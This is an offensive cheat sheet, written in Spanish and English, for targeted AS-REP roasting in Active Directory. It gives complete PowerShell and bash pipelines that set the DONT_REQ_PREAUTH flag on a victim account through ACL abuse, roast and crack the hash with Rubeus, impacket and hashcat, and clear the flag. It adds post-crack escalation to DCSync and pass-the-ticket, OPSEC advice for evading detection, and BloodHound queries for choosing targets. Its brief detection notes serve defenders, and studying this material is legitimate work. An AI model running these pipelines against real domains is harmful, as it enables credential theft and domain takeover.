---
aliases:
  - Targeted AS-REP Roasting
  - UAC XOR Attack
  - DONT_REQ_PREAUTH ACL Abuse
tags:
  - type/technique
  - technique/credential-access
  - technique/kerberos
  - asset/active-directory
  - cred/kerberos
primary categories: null
secondary categories: null
tertiary categories: null
kind: SubCheatSheet
linked:
  - '[[AS-REP Roasting]]'
---
# AS-REP Roasting - Targeted Roasting

***

## Concept

| **Aspecto** | **Detalle** |
|:---:|:---:|
| Mecanismo | User sin `DONT_REQ_PREAUTH` flag → atacante set flag temporario → roast → clear flag |
| Required ACL | `WriteProperty userAccountControl` o `GenericAll/Write` sobre target |
| Por qué | Modern domains tienen 0 users con flag set → targeted abuse para crear vulnerabilidad temporary |
| Ventaja sobre AS-REP standard | No depende de flag pre-existente (set + roast + clear) |
| Detection | Event 5136 (LDAP modify userAccountControl) + Event 4768 con pre-auth=0 |
^asrep-targeted-concept

___

## ACL Required

| **Right** | **Source** | **Suficiente** |
|:---:|:---:|:---:|
| `WriteProperty userAccountControl` (specific UAC attribute) | Direct | **Sí**. |
| `GenericWrite` | Modify any attribute | Sí. |
| `GenericAll` | Full control | Sí. |
| `WriteOwner` | Take ownership → grant self | Multi-step. |
| `WriteDacl` | Modify DACL → grant self | Multi-step. |
^asrep-targeted-acl

```powershell
# Hunt principals con write sobre UAC attr
Find-InterestingDomainAcl -ResolveGUIDs |
  Where {
    ($_.ObjectAceType -eq "User-Account-Control" -or
     $_.ActiveDirectoryRights -match "GenericAll|GenericWrite|WriteDacl|WriteOwner") -and
    $_.IdentityReferenceClass -eq "user"
  } |
  Select ObjectDN,IdentityReferenceName,ActiveDirectoryRights,ObjectAceType
```

___

## Attack Workflow

| **Step** | **Comando** | **Detalle** |
|:---:|:---:|:---:|
| 1. Identificar ACL `WriteProperty UAC` o broader | BloodHound + Find-InterestingDomainAcl | Pre-attack. |
| 2. Save current UAC value | `Get-ADUser <victim> -Pr UserAccountControl` | Backup. |
| 3. Set DONT_REQ_PREAUTH flag (XOR `0x400000`) | `Set-ADAccountControl -Identity <victim> -DoesNotRequirePreAuth $true` | Privesc. |
| 4. Request AS-REP (roast) | `Rubeus.exe asreproast /user:<victim>` o `impacket-GetNPUsers ... -request` | Roast. |
| 5. Crack hash offline | `hashcat -m 18200 hash.txt rockyou.txt -O` | Crack. |
| 6. Cleanup flag (OPSEC) | `Set-ADAccountControl -Identity <victim> -DoesNotRequirePreAuth $false` | Hygiene. |
^asrep-targeted-workflow

```powershell
# Pipeline completo PowerShell
$Victim = "jsmith"

# Backup
$OriginalUAC = (Get-ADUser $Victim -Properties UserAccountControl).UserAccountControl

# Set DONT_REQ_PREAUTH
Set-ADAccountControl -Identity $Victim -DoesNotRequirePreAuth $true

# Roast
Rubeus.exe asreproast /user:$Victim /format:hashcat /outfile:targeted.hash

# Cleanup
Set-ADAccountControl -Identity $Victim -DoesNotRequirePreAuth $false

# Verify cleanup
Get-ADUser $Victim -Properties UserAccountControl

# Crack
hashcat -m 18200 targeted.hash rockyou.txt -O
```

___

## bloodyAD Targeted (Linux)

| **Comando** | **Qué hace** | **Cuándo** |
|:---:|:---:|:---:|
| `bloodyAD --host <DC> -d corp -u u -p pass set uac <victim> -f DONT_REQ_PREAUTH` | Set flag | Privesc step. |
| `bloodyAD --host <DC> -d corp -u u -p pass remove uac <victim> -f DONT_REQ_PREAUTH` | Clear flag | Cleanup. |
^asrep-targeted-bloodyad

```bash
# Pipeline Linux completo
VICTIM=jsmith

# Set flag
bloodyAD --host <DC> -d corp -u atacante -p 'Pass!' \
  set uac $VICTIM -f DONT_REQ_PREAUTH

# Roast
impacket-GetNPUsers corp.local/$VICTIM -dc-ip <DC> -no-pass \
  -format hashcat -outputfile targeted.hash

# Cleanup
bloodyAD --host <DC> -d corp -u atacante -p 'Pass!' \
  remove uac $VICTIM -f DONT_REQ_PREAUTH

# Crack
hashcat -m 18200 targeted.hash rockyou.txt -O
```

___

## XOR Method (Legacy PowerView)

| **Comando** | **Qué hace** | **Cuándo** |
|:---:|:---:|:---:|
| `Set-DomainObject -Identity <victim> -XOR @{useraccountcontrol=4194304}` (PowerView) | XOR toggle flag (set if off, off if on) | Legacy method. |
^asrep-targeted-xor

**Caveat XOR:** XOR toggles. Si flag ya set → unsets. Si off → sets. Run twice = revert. Risky si UAC ya tiene flag custom; modern recommend `Set-ADAccountControl` que es additive.

___

## Post-Crack Privesc

| **Comando** | **Qué hace** | **Cuándo** |
|:---:|:---:|:---:|
| `nxc smb <DC> -u <victim> -p '<cracked>'` | Validate cracked password | Post-crack. |
| `nxc smb <DC> -u <victim> -p '<cracked>' --groups` | Effective groups | Privesc check. |
| `impacket-secretsdump corp.local/<victim>:'<cracked>'@<DC>` | Si DA → DCSync | Privesc chain. |
| `Rubeus.exe asktgt /user:<victim> /password:<cracked> /domain:corp.local /ptt` | TGT con cracked pwd | Standard auth. |
^asrep-targeted-postcrack

___

## OPSEC

| **Práctica** | **Detalle** | **Cuándo** |
|:---:|:---:|:---:|
| Cleanup ALWAYS post-roast | Restore UAC | Hygiene critical. |
| Single user a la vez | No bulk targeted | Reduce events. |
| Time gap entre set y roast (>30sec) | Reduce correlation | OPSEC. |
| Detection: Event 5136 (UAC modify) + 4768 (AS-REQ pre-auth=0) within window | SIEM rule | Defender side. |
| Backup original UAC | Restore exacto | Forensic-clean. |
^asrep-targeted-opsec

___

## BloodHound Targeted Edges

| **Cypher** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `MATCH (u {owned:true})-[:GenericAll\|GenericWrite\|WriteDacl\|WriteOwner]->(t:User) WHERE NOT t.dontreqpreauth RETURN u,t` | Owned con write sobre users sin DONT_REQ_PREAUTH (targeted candidates) | Path planning. |
| `MATCH p=shortestPath((u {owned:true})-[*1..3]->(t:User {adminCount:true})) WHERE NOT t.dontreqpreauth RETURN p` | Path a priv users sin flag | Critical hunt. |
^asrep-targeted-bh

___

## Common Errors

| **Error** | **Causa** | **Fix** |
|:---:|:---:|:---:|
| `Insufficient access rights` | Sin `WriteProperty UAC` o broader | Need correct ACE. |
| `Set-ADAccountControl` falla | Account ya disabled / locked | Verify Enabled flag first. |
| Roast retorna 0 hashes | Flag set fail o user disabled | Verify post-set UAC value. |
| Cleanup falla | Race condition / lock | Retry o force LDAP modify. |
| `Object class violation` | Trying to set flag en computer account | Skip computers (no kerberoast utility). |
^asrep-targeted-errors

***
